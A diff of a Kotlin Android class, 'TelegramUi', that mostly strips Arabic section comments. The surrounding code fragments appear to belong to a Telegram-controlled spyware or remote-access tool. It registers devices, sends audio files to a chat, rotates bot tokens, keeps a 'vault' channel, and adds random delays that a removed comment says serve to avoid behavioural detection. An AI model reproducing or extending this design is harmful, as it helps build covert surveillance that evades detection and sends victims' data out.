@@ -103,12 +103,10 @@ class TelegramUi(
         Log.i(TAG, "✅ TelegramUi initialized. Password status: ${if (appPassword.isNotBlank()) "Set" else "Empty"}")
     }
 
-    // ========== تأخير بشري لتجنب الكشف السلوكي ==========
     private suspend fun applyHumanDelay() {
         delay(Random.nextLong(900, 2400))
     }
 
-    // ========== إرسال نبض للخدمة الأمامية (إشعار عابر) ==========
     private fun pulseIntent(action: String) {
         try {
             Intent(appContext, ForegroundService::class.java).apply {
@@ -120,7 +118,6 @@ class TelegramUi(
         }
     }
 
-    // ========== تحميل وحفظ البيانات ==========
     private fun loadData() {
         try {
             if (dvsFile.exists()) {
@@ -175,7 +172,6 @@ class TelegramUi(
         }
     }
 
-    // ========== إدارة التوكنات ==========
     private fun getNextToken(): String? {
         synchronized(activeTokensList) {
             if (activeTokensList.isEmpty()) return null
@@ -205,7 +201,6 @@ class TelegramUi(
         }
     }
 
-    // ========== العمال الخلفيون ==========
     private fun startBackgroundWorkers() {
         cleanerJob = scope.launch {
             while (isActive) {
@@ -267,13 +262,12 @@ class TelegramUi(
         }
     }
 
-    // ========== استدعاءات API (تم إصلاح Val cannot be reassigned) ==========
+    // ✅ تم إصلاح خطأ Val cannot be reassigned (جميع المتغيرات التي يُعاد تعيينها هي var)
     private suspend fun apiCall(method: String, payload: JSONObject? = null, retry: Int = 3): JSONObject? {
         apiCallsCount++
         var attempts = 0
         var previousToken: String? = null
         while (attempts < retry) {
-            // ✅ تم تغيير val إلى var لمنع خطأ reassign
             var token1 = getNextToken()
             if (token1 == null) return null
             var tokenToUse = if (attempts > 0 && token1 == previousToken) {
@@ -321,7 +315,6 @@ class TelegramUi(
         var attempts = 0
         var previousToken: String? = null
         while (attempts < retry) {
-            // ✅ تم تغيير val إلى var لمنع خطأ reassign
             var token1 = getNextToken()
             if (token1 == null) return null
             var tokenToUse = if (attempts > 0 && token1 == previousToken) {
@@ -402,7 +395,6 @@ class TelegramUi(
         return _api("sendAudio", mapOf("chat_id" to chatId, "caption" to caption), mapOf("audio" to file))
     }
 
-    // ========== تسجيل الأجهزة ==========
     fun registerDevice(deviceId: String, deviceModel: String): Long? {
         return runBlocking(Dispatchers.IO) { registerDeviceSuspend(deviceId, deviceModel) }
     }
@@ -497,7 +489,6 @@ class TelegramUi(
         } catch (e: Exception) { 0 }
     }
 
-    // ========== لوحات المفاتيح (مع إيموجيات فريدة) ==========
     private fun getMainKeyboard(): JSONObject {
         return JSONObject().apply {
             put("inline_keyboard", JSONArray().apply {
@@ -582,7 +573,6 @@ class TelegramUi(
         return (System.currentTimeMillis() / 1000) < exp
     }
 
-    // ========== معالجة الرسائل ==========
     private suspend fun handleMessage(update: JSONObject) {
         try {
             val msg = update.optJSONObject("message") ?: return
@@ -631,7 +621,6 @@ class TelegramUi(
         }
     }
 
-    // ========== معالجة الأزرار ==========
     private suspend fun handleCallback(update: JSONObject) {
         try {
             applyHumanDelay()
@@ -915,7 +904,6 @@ class TelegramUi(
         }
     }
 
-    // ========== حلقة استقبال التحديثات (Polling) ==========
     private fun startPolling() {
         pollingJob = scope.launch {
             var offset = loadOffset()
@@ -961,7 +949,6 @@ class TelegramUi(
         }
     }
 
-    // ========== إدارة دورة الحياة ==========
     fun start(): Boolean {
         if (activeTokensList.isEmpty()) {
             writeLog("No active tokens")
@@ -1004,7 +991,6 @@ class TelegramUi(
     fun getCtrl(): Long = config.controlId
     fun getDat(): Long = config.vaultId
 
-    // ========== أدوات مساعدة ==========
     private fun writeLog(message: String) {
         Log.i(TAG, message)
         try {
